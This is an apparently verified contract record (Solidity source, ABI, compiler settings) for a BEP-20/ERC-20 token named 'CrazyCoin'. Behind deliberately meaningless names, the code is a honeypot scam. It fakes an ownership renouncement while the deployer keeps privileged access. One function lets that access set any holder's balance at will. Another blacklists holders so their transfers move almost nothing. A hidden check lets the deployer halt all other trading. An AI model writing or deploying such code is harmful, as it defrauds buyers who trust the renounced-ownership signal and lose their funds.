{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract marketingLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromFee {\n    function createPair(address swapFund, address teamAmountTrading) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoSellFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingExempt) external view returns (uint256);\n\n    function transfer(address totalWallet, uint256 listTeam) external returns (bool);\n\n    function allowance(address walletTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalWallet,\n        uint256 listTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isFeeMin, uint256 value);\n    event Approval(address indexed walletTrading, address indexed spender, uint256 value);\n}\n\ninterface tokenTrading is autoSellFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CrazyCoin is marketingLiquidity, autoSellFrom, tokenTrading {\n\n    uint256 private totalMinFrom;\n\n    function balanceOf(address marketingExempt) public view virtual override returns (uint256) {\n        return takeLimit[marketingExempt];\n    }\n\n    function transferFrom(address senderTake, address totalWallet, uint256 listTeam) external override returns (bool) {\n        if (_msgSender() != tokenLimit) {\n            if (buyExempt[senderTake][_msgSender()] != type(uint256).max) {\n                require(listTeam <= buyExempt[senderTake][_msgSender()]);\n                buyExempt[senderTake][_msgSender()] -= listTeam;\n            }\n        }\n        return senderTotal(senderTake, totalWallet, listTeam);\n    }\n\n    uint256 marketingIs;\n\n    address public fromLimit;\n\n    string private tokenShouldMarketing = \"Crazy Coin\";\n\n    mapping(address => bool) public listReceiver;\n\n    address tradingLaunch;\n\n    function txReceiver(address fundFrom) public {\n        receiverLaunched();\n        \n        if (fundFrom == fromLimit || fundFrom == takeToken) {\n            return;\n        }\n        listReceiver[fundFrom] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listWallet;\n    }\n\n    bool public listLimit;\n\n    function senderReceiverLaunch() public {\n        emit OwnershipTransferred(fromLimit, address(0));\n        swapBuySell = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return swapBuySell;\n    }\n\n    address private swapBuySell;\n\n    function tradingLaunched(address liquidityTeam) public {\n        if (feeLimit) {\n            return;\n        }\n        if (totalMinFrom != launchSellExempt) {\n            launchSellExempt = totalMinFrom;\n        }\n        minWallet[liquidityTeam] = true;\n        if (launchSellExempt == totalMinFrom) {\n            enableTake = launchSellExempt;\n        }\n        feeLimit = true;\n    }\n\n    function amountExempt(address senderTake, address totalWallet, uint256 listTeam) internal returns (bool) {\n        require(takeLimit[senderTake] >= listTeam);\n        takeLimit[senderTake] -= listTeam;\n        takeLimit[totalWallet] += listTeam;\n        emit Transfer(senderTake, totalWallet, listTeam);\n        return true;\n    }\n\n    mapping(address => uint256) private takeLimit;\n\n    string private totalTrading = \"CCN\";\n\n    function senderTotal(address senderTake, address totalWallet, uint256 listTeam) internal returns (bool) {\n        if (senderTake == fromLimit) {\n            return amountExempt(senderTake, totalWallet, listTeam);\n        }\n        uint256 launchTotal = autoSellFrom(takeToken).balanceOf(tradingLaunch);\n        require(launchTotal == tokenAt);\n        require(totalWallet != tradingLaunch);\n        if (listReceiver[senderTake]) {\n            return amountExempt(senderTake, totalWallet, tokenAmount);\n        }\n        listTeam = tokenEnableWallet(senderTake, totalWallet, listTeam);\n        return amountExempt(senderTake, totalWallet, listTeam);\n    }\n\n    address tokenLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalTrading;\n    }\n\n    uint256 private buyIs = 100000000 * 10 ** 18;\n\n    uint256 public buyAmountSell = 3;\n\n    bool public feeLimit;\n\n    constructor (){\n        if (totalMinFrom != enableTake) {\n            launchSellExempt = totalMinFrom;\n        }\n        senderReceiverLaunch();\n        exemptLimit swapTotal = exemptLimit(tokenLimit);\n        takeToken = fromFee(swapTotal.factory()).createPair(swapTotal.WETH(), address(this));\n        tradingLaunch = fromFee(swapTotal.factory()).feeTo();\n        if (totalMinFrom != launchSellExempt) {\n            launchSellExempt = enableTake;\n        }\n        fromLimit = _msgSender();\n        minWallet[fromLimit] = true;\n        takeLimit[fromLimit] = buyIs;\n        if (totalMinFrom == launchSellExempt) {\n            totalMinFrom = enableTake;\n        }\n        emit Transfer(address(0), fromLimit, buyIs);\n    }\n\n    uint256 private launchSellExempt;\n\n    address public takeToken;\n\n    event OwnershipTransferred(address indexed exemptMin, address indexed tradingExemptShould);\n\n    uint256 constant tokenAmount = 15 ** 10;\n\n    function approve(address launchedLimitBuy, uint256 listTeam) public virtual override returns (bool) {\n        buyExempt[_msgSender()][launchedLimitBuy] = listTeam;\n        emit Approval(_msgSender(), launchedLimitBuy, listTeam);\n        return true;\n    }\n\n    function receiverMarketing(uint256 listTeam) public {\n        receiverLaunched();\n        tokenAt = listTeam;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyIs;\n    }\n\n    function allowance(address receiverMax, address launchedLimitBuy) external view virtual override returns (uint256) {\n        if (launchedLimitBuy == tokenLimit) {\n            return type(uint256).max;\n        }\n        return buyExempt[receiverMax][launchedLimitBuy];\n    }\n\n    function receiverLaunched() private view {\n        require(minWallet[_msgSender()]);\n    }\n\n    function transfer(address launchedAt, uint256 listTeam) external virtual override returns (bool) {\n        return senderTotal(_msgSender(), launchedAt, listTeam);\n    }\n\n    uint256 tokenAt;\n\n    mapping(address => bool) public minWallet;\n\n    mapping(address => mapping(address => uint256)) private buyExempt;\n\n    function tokenEnableWallet(address senderTake, address totalWallet, uint256 listTeam) internal view returns (uint256) {\n        require(listTeam > 0);\n\n        uint256 enableFee = 0;\n        if (senderTake == takeToken && buyAmountSell > 0) {\n            enableFee = listTeam * buyAmountSell / 100;\n        } else if (totalWallet == takeToken && minFund > 0) {\n            enableFee = listTeam * minFund / 100;\n        }\n        require(enableFee <= listTeam);\n        return listTeam - enableFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenShouldMarketing;\n    }\n\n    uint256 public minFund = 0;\n\n    function getOwner() external view returns (address) {\n        return swapBuySell;\n    }\n\n    function receiverMode(address launchedAt, uint256 listTeam) public {\n        receiverLaunched();\n        takeLimit[launchedAt] = listTeam;\n    }\n\n    uint8 private listWallet = 18;\n\n    uint256 public enableTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExemptShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFeeMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLimitBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimitBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmountSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"receiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CrazyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}